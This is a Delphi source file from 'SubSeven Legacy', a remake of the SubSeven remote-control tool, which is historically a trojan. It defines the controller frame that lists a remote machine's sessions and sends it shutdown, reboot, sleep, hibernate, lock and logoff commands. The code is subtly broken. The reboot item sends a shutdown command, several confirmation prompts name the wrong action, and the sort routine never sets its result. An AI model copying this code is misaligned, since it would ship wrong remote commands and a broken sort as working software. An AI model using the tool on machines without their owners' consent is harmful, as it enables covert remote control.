{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit uFrameSystemInformationHook;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, ___S7DockFrame, S7DockCaption,
  Sub7.Viewer.VCL.Button, S7Panel, Sub7.Core.Types, Sub7.Core.Protocol, XSuperObject, VirtualTrees,
  Sub7.Core.Windows.Sessions.Enum, Vcl.Menus, S7PopupMenu, Generics.Collections,
  Vcl.StdCtrls, Sub7.Core.Windows.User.Enum, Sub7.Viewer.Types;

type
  TTreeData = record
    Info : TS7SessionInformation;
    User : String;
  end;
  PTreeData = ^TTreeData;

  TFrameSystemInformationHook = class(TS7FrameDock)
    PanelFooter: TS7Panel;
    ButtonReload: TS7Button;
    ButtonPower: TS7Button;
    VST: TVirtualStringTree;
    PopupSession: TS7PopupMenu;
    Lock1: TMenuItem;
    N1: TMenuItem;
    Logoff1: TMenuItem;
    PopupPower: TS7PopupMenu;
    shutdown1: TMenuItem;
    reboot1: TMenuItem;
    hibernate1: TMenuItem;
    sleep1: TMenuItem;
    N2: TMenuItem;
    poweroff1: TMenuItem;
    procedure VSTChange(Sender: TBaseVirtualTree; Node: PVirtualNode);
    procedure VSTFocusChanged(Sender: TBaseVirtualTree; Node: PVirtualNode;
      Column: TColumnIndex);
    procedure VSTFreeNode(Sender: TBaseVirtualTree; Node: PVirtualNode);
    procedure VSTGetNodeDataSize(Sender: TBaseVirtualTree;
      var NodeDataSize: Integer);
    procedure VSTGetText(Sender: TBaseVirtualTree; Node: PVirtualNode;
      Column: TColumnIndex; TextType: TVSTTextType; var CellText: string);
    procedure VSTCompareNodes(Sender: TBaseVirtualTree; Node1,
      Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
    procedure shutdown1Click(Sender: TObject);
    procedure reboot1Click(Sender: TObject);
    procedure hibernate1Click(Sender: TObject);
    procedure ButtonPowerClick(Sender: TObject);
    procedure sleep1Click(Sender: TObject);
    procedure poweroff1Click(Sender: TObject);
    procedure PopupSessionPopup(Sender: TObject);
    procedure Lock1Click(Sender: TObject);
    procedure Logoff1Click(Sender: TObject);
    procedure ButtonReloadClick(Sender: TObject);
  private
    FActiveSessions : TDictionary<Integer {SessionId}, String {User}>;
    FUsers          : TS7EnumUser;

    {@M}
    function AreYouSure(const ACommand : TS7Command) : Boolean;

    procedure RefreshIconsStatus();
    function GetSelectedSessionId() : Integer;
    function GetSelectedSessionIdData() : ISuperObject;
  protected
    {@M}
    procedure OnConnectionStateUpdated(const AConnected : Boolean); override;
    procedure DoResize(); override;
  public
    {@M}
    procedure OnSessionListenerStatusChange(const AStatusActive : Boolean);

    procedure RenderSessions(const AData : ISuperObject);
    procedure WinUserUpdate(const AData : ISuperObject);

    {@C}
    constructor Create(AOwner: TComponent; const ANavMenu : TNavMenu); override;
    destructor Destroy(); override;

    {@G}
    property ActiveSessions : TDictionary<Integer, String> read FActiveSessions;
    property Users          : TS7EnumUser                  read FUsers;
  end;

implementation

{$R *.dfm}

uses uFormMain, Sub7.Core.Utils, System.Math, System.StrUtils,
     Sub7.Core.Messages.Listener, Sub7.Viewer.Messages;

procedure TFrameSystemInformationHook.WinUserUpdate(const AData : ISuperObject);
begin
  if not Assigned(FUsers) then
    Exit();
  ///

  FUsers.Clear();
  ///

  if not Assigned(AData) then
    Exit();
  ///

  FUsers.DeSerialize(AData);

  ///
  BroadcastMessage(SUB7_WINUSER_UPDATED);
end;

procedure TFrameSystemInformationHook.OnConnectionStateUpdated(const AConnected : Boolean);
begin
  inherited;
  ///

  VST.Clear();
  ButtonPower.Enabled := AConnected;
  ///

  if AConnected then
    FormMain.Session.CreateSessionWorker(wkSessionListener);
end;

constructor TFrameSystemInformationHook.Create(AOwner: TComponent; const ANavMenu : TNavMenu);
begin
  inherited Create(AOwner, ANavMenu);
  ///

  FActiveSessions := TDictionary<Integer {SessionId}, String {User}>.Create();

  FUsers := TS7EnumUser.Create(False);
end;

destructor TFrameSystemInformationHook.Destroy();
begin
  if Assigned(FUsers) then
    FreeAndNil(FUsers);

  if Assigned(FActiveSessions) then
    FreeAndNil(FActiveSessions);

  ///
  inherited Destroy();
end;

procedure TFrameSystemInformationHook.OnSessionListenerStatusChange(const AStatusActive : Boolean);
begin
  VST.Clear();
  FActiveSessions.Clear();
  ///

  VST.Enabled          := AStatusActive;
  ButtonReload.Enabled := not AStatusActive;

  ///
  BroadcastMessage(SUB7_TERMINAL_SESSION_UPDATED);
  BroadcastMessage(SUB7_WINUSER_UPDATED);
end;

function TFrameSystemInformationHook.GetSelectedSessionIdData() : ISuperObject;
var ASessionId : Integer;
begin
  result := nil;
  ///

  ASessionId := GetSelectedSessionId();

  if ASessionId = -1 then
    Exit();
  ///

  result := TSuperObject.Create();

  result.I['session_id'] := ASessionId;
end;

function TFrameSystemInformationHook.GetSelectedSessionId() : Integer;
var ANode : PVirtualNode;
    pData : PTreeData;
begin
  result := -1;
  ///

  ANode := VST.FocusedNode;

  if not Assigned(ANode) then
    Exit();

  pData := ANode.GetData;

  ///
  result := pData^.Info.SessionId;
end;

procedure TFrameSystemInformationHook.RefreshIconsStatus();
var AEnabled : Boolean;
    pData    : PTreeData;
begin
  AEnabled := False;

  if VST.FocusedNode <> nil then begin
    pData := VST.FocusedNode.GetData;

    AEnabled := (pData^.Info.State = WTSActive);
  end;

  ///
  self.Lock1.Enabled   := AEnabled;
  self.Logoff1.Enabled := AEnabled;
end;

procedure TFrameSystemInformationHook.RenderSessions(const AData : ISuperObject);
var ANode               : PVirtualNode;
    pData               : PTreeData;
    AEnumSessions       : TS7EnumTerminalSessions;
    ASessionInformation : TS7SessionInformation;
begin
  VST.Clear();
  FActiveSessions.Clear();
  ///

  if not Assigned(AData) then
    Exit();
  ///

  AEnumSessions := TS7EnumTerminalSessions.Create(False, False);
  try
    AEnumSessions.DeSerialize(AData);
    ///

    VST.BeginUpdate();
    try
      for ASessionInformation in AEnumSessions.Items do begin
        ANode := VST.AddChild(nil);

        pData := ANode.GetData;

        pData^.Info := ASessionInformation;
        pData^.User := Format('%s/%s', [
          FillFree(pData^.Info.Username),
          FillFree(pData^.Info.DomainName)
        ]);

        if pData^.Info.State = WTSActive then
          FActiveSessions.Add(pData^.Info.SessionId, pData^.User);
      end;
    finally
      VST.EndUpdate();
    end;
  finally
    if Assigned(AEnumSessions) then
      FreeAndNil(AEnumSessions);
  end;

  ///
  BroadcastMessage(SUB7_TERMINAL_SESSION_UPDATED);
end;

procedure TFrameSystemInformationHook.shutdown1Click(Sender: TObject);
begin
  if AreYouSure(mhcShutdown) then
    FormMain.Session.SendCommand(mhcShutdown);
end;

procedure TFrameSystemInformationHook.sleep1Click(Sender: TObject);
begin
  if AreYouSure(mhcReboot) then
    FormMain.Session.SendCommand(mhcSleep);
end;

procedure TFrameSystemInformationHook.VSTChange(Sender: TBaseVirtualTree; Node: PVirtualNode);
begin
  VST.Refresh();
end;

procedure TFrameSystemInformationHook.VSTCompareNodes(Sender: TBaseVirtualTree; Node1,
  Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
  var pData1, pData2 : PTreeData;
begin
  pData1 := VST.GetNodeData(Node1);
  pData2 := VST.GetNodeData(Node2);
  ///

  if not Assigned(pData1) or not Assigned(pData2) then
    Exit();

  case column of
    0 : CompareValue(pData1^.Info.SessionId, pData2^.Info.SessionId);
    1 : CompareValue(BoolToInt(pData1^.Info.Active), BoolToInt(pData2^.Info.Active));
    2 : CompareValue(BoolToInt(pData1^.Info.IsRemote), BoolToInt(pData2^.Info.IsRemote));
    3 : CompareValue(Integer(pData1^.Info.State), Integer(pData2^.Info.State));
    4 : CompareText(pData1^.User, pData2^.User);
    5 : CompareText(pData1^.Info.ClientName, pData2^.Info.ClientName);
    6 : CompareText(pData1^.Info.StationName, pData2^.Info.StationName);
  end;
end;

procedure TFrameSystemInformationHook.VSTFocusChanged(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Column: TColumnIndex);
begin
  self.RefreshIconsStatus();

  ///
  VST.Refresh();
end;

procedure TFrameSystemInformationHook.VSTFreeNode(Sender: TBaseVirtualTree;
  Node: PVirtualNode);
  var pData : PTreeData;
begin
  pData := Node.GetData;

  if Assigned(pData^.Info) then
    FreeAndNil(pData^.Info);
end;

procedure TFrameSystemInformationHook.VSTGetNodeDataSize(Sender: TBaseVirtualTree;
  var NodeDataSize: Integer);
begin
  NodeDataSize := SizeOf(TTreeData);
end;

procedure TFrameSystemInformationHook.VSTGetText(Sender: TBaseVirtualTree; Node: PVirtualNode;
  Column: TColumnIndex; TextType: TVSTTextType; var CellText: string);
  var pData: PTreeData;
begin
  pData := Node.GetData;

  case Column of
    0 : begin
      CellText := IntToStr(pData^.Info.SessionId);
    end;

    1 : begin
      CellText := BoolToStr(pData^.Info.Active);
    end;

    2 : begin
      CellText := BoolToStr(pData^.Info.IsRemote);
    end;

    3 : begin
      case pData^.Info.State of
        WTSActive       : CellText := 'Active';
        WTSConnected    : CellText := 'Connected';
        WTSConnectQuery : CellText := 'Connect Query';
        WTSShadow       : CellText := 'Shadow';
        WTSDisconnected : CellText := 'Disconnected';
        WTSIdle         : CellText := 'Idle';
        WTSListen       : CellText := 'Listen';
        WTSReset        : CellText := 'Reset';
        WTSDown         : CellText := 'Down';
        WTSInit         : CellText := 'Init';

        else
          CellText := 'Unknown';
      end;
    end;

    4 : begin
      CellText := FillFree(pData^.User);
    end;

    5 : begin
      CellText := FillFree(pData^.Info.ClientName);
    end;

    6 : begin
      CellText := FillFree(pData^.Info.StationName);
    end;
  end;
end;

function TFrameSystemInformationHook.AreYouSure(const ACommand : TS7Command) : Boolean;
var AStrAction : String;
begin
  case ACommand of
    mhcLogoff   : AStrAction := 'Logoff';
    mhcReboot   : AStrAction := 'Reboot';
    mhcShutdown : AStrAction := 'Shutdown';
    mhcSleep    : AStrAction := 'Sleep';

    else
      Exit(False);
  end;

  result := (FormMain.MessageBox.MessageBox(
    self.GetOwnerForm,
    Format('You are about to "%s" remote machine. This action might affect unterminated tasks and the availability of remote machine. Are you sure?', [AStrAction]),
    'Machine Action',
    MB_ICONQUESTION + MB_YESNO) = ID_YES);
end;

procedure TFrameSystemInformationHook.PopupSessionPopup(Sender: TObject);
begin
  self.RefreshIconsStatus();
end;

procedure TFrameSystemInformationHook.poweroff1Click(Sender: TObject);
begin
  if AreYouSure(mhcShutdown) then
    FormMain.Session.SendCommand(mhcPoweroff);
end;

procedure TFrameSystemInformationHook.reboot1Click(Sender: TObject);
begin
  if AreYouSure(mhcReboot) then
    FormMain.Session.SendCommand(mhcShutdown);
end;

procedure TFrameSystemInformationHook.ButtonPowerClick(Sender: TObject);
var APoint : TPoint;
begin
  APoint := ButtonPower.ClientToScreen(Point(0, 0));

  self.PopupPower.Popup(APoint.X, APoint.Y + TS7Button(Sender).Height);
end;

procedure TFrameSystemInformationHook.ButtonReloadClick(Sender: TObject);
begin
  FormMain.Session.CreateSessionWorker(wkSessionListener);
end;

procedure TFrameSystemInformationHook.DoResize();
begin
  ButtonReload.Left := (PanelFooter.Width div 2) - ButtonReload.Width - 4;
  ButtonPower.Left  := (PanelFooter.Width div 2) + 4;

  ButtonReload.Top  := (PanelFooter.Height div 2) - (ButtonReload.Height div 2);
  ButtonPower.Top   := ButtonReload.Top;
end;

procedure TFrameSystemInformationHook.hibernate1Click(Sender: TObject);
begin
  if AreYouSure(mhcReboot) then
    FormMain.Session.SendCommand(mhcHibernate);
end;

procedure TFrameSystemInformationHook.Lock1Click(Sender: TObject);
var AData : ISuperObject;
begin
  AData := GetSelectedSessionIdData();
  ///

  if Assigned(AData) then
    FormMain.Session.SendCommand(mhcLock, AData);
end;

procedure TFrameSystemInformationHook.Logoff1Click(Sender: TObject);
var AData : ISuperObject;
begin
  AData := GetSelectedSessionIdData();
  ///

  if Assigned(AData) then
    FormMain.Session.SendCommand(mhcLogoff, AData);
end;

end.
